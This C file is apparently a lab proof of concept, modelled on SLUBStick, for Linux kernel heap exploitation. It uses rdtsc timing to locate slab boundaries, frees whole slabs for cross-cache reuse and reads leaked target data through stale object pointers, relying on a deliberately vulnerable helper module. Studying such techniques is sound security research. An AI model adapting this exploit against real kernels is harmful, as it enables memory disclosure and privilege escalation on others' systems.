#include "libs/pwn.h"
#include "libs/gfp_types.h"
#include <stdlib.h>
#include <strings.h>
#include <unistd.h>

/*
 * inspired by https://github.com/IAIK/SLUBStick
 */


void *keap_vuln;
#define YIELD(i) do { for (size_t _i = 0; _i < i; ++_i) sched_yield(); } while (0)
#define THRESHOLD -800

void** objs;
void alloc_obj(size_t i)
{
    objs[i] = keap_malloc(cur->size, GFP_KERNEL_ACCOUNT);
}

void free_obj(size_t i)
{
    keap_free(objs[i]);
}

static size_t *start_indexes;

void alloc_objs(void)
{
    linfo("allocate %ld objs", cur->allocs);
    for (size_t i = cur->allocs; i < cur->allocs*2; ++i)
        alloc_obj(i);
}

enum state {
    INIT = 0,
    INVALID_FREE,
    ALLOC_CONTD,
    WRITE,
    PAGE_TABLE_ACCESS,
};

void timed_alloc_objs(void)
{
    int ret;

    size_t t0;
    size_t t1;
    ssize_t time = 0;
    ssize_t prev_time = 0;
    ssize_t derived_time = 0;
    ssize_t start = -1;
    size_t running = 0;

    linfo("allocate %ld objs", cur->allocs);
    for (size_t i = 0; i < cur->allocs; ++i) {
        sched_yield();
        t0 = rdtsc();
        alloc_obj(i);
        t1 = rdtsc();

        prev_time = time;
        time = t1 - t0;
        if (i > cur->allocs/16) {
            derived_time = time - prev_time;
            // linfo("derived time %ld", derived_time);
            if (start == -1) {
                if (derived_time < THRESHOLD) {
                    start = i;
                    continue;
                }
            } else if (i - start == cur->objs_per_slab) {
                if (derived_time < THRESHOLD) {
                    start_indexes[running] = start;
                    running++;
                    if (running == cur->slab_per_chunk)
                        break;
                    start = i;
                } else {
                    start = i;
                    running = 0;
                }
            }
        }
    }
    if (running != cur->slab_per_chunk)
        lerror("RETRY (start not found)");
    for (size_t i = 0; i < cur->slab_per_chunk; ++i)
        ldebug("start %ld", start_indexes[i]);
}

#define TARGET_SIZE 0x100
#define TARGET_CHUNKS 0x800
void* target_objs[TARGET_CHUNKS];
void free_objs_and_alloc_mmap(void)
{
    char *buf = cyclic(TARGET_SIZE);
    char *clear[cur->size];
    bzero(clear, sizeof(clear));

    linfo("empty caches and free objs slab per chunk %ld obj per slab %ld", cur->slab_per_chunk, cur->objs_per_slab);
    keap_write(objs[start_indexes[0] - 3], clear, cur->size);
    free_obj(start_indexes[0] - 3);
    keap_write(objs[start_indexes[0] - 2], clear, cur->size);
    free_obj(start_indexes[0] - 2);
    keap_write(objs[start_indexes[0] - 1], clear, cur->size);
    free_obj(start_indexes[0] - 1);
    for (size_t i = 0; i < cur->slab_per_chunk; ++i) {
        for (ssize_t j = 0; j < (ssize_t)cur->objs_per_slab; ++j) {
            keap_write(objs[start_indexes[i] + j], clear, cur->size);
            free_obj(start_indexes[i] + j);
        }
    }

    linfo("fill target slabs");
    for(int i = 0; i < TARGET_CHUNKS; ++i) {
        target_objs[i] = keap_malloc(TARGET_SIZE, GFP_KERNEL);
        keap_write(target_objs[i], buf, TARGET_SIZE);
    }
    free(buf);

}

size_t get_leaks() {
    size_t leaks = 0;
    char *leak[cur->size];

    for (size_t i = 0; i < cur->slab_per_chunk; ++i) {
        for (ssize_t j = 0; j < (ssize_t)cur->objs_per_slab; ++j) {
            bzero(leak, sizeof(leak));
            keap_read(objs[start_indexes[i] + j], leak, cur->size);
            if(strcmp(leak, "") != 0) ++leaks;
        }
    }

    linfo("got %ld/%ld successfull leaks", leaks, cur->slab_per_chunk * cur->objs_per_slab);

    return leaks;
}

void cleanup(void) {
    for (size_t i = cur->allocs; i < cur->allocs * 2; ++i) {
        free_obj(i);
    }
}

/**
* main function
*/
int main(int argc, char *argv[])
{
    size_t slab_size = argc < 2 ? 192 : strtol(argv[1], 0, 10);
    size_t leaks = 0;

    if (slab_size < 32)
        lwarn("slab size < 32 is very unreliable");

    lstage("init");
    init();
    set_current_slab_info(slab_size);
    rlimit_increase(RLIMIT_NOFILE);
    start_indexes = calloc(cur->slab_per_chunk, sizeof(size_t));
    objs = calloc(cur->allocs*2, sizeof(void*));

    lstage("alloc");
    alloc_objs();
    timed_alloc_objs();

    lstage("free slab page");
    free_objs_and_alloc_mmap();

    lstage("test for leak");
    leaks = get_leaks();

    lstage("done");

    cleanup();

    return leaks > 0 ? EXIT_SUCCESS : EXIT_FAILURE;

}
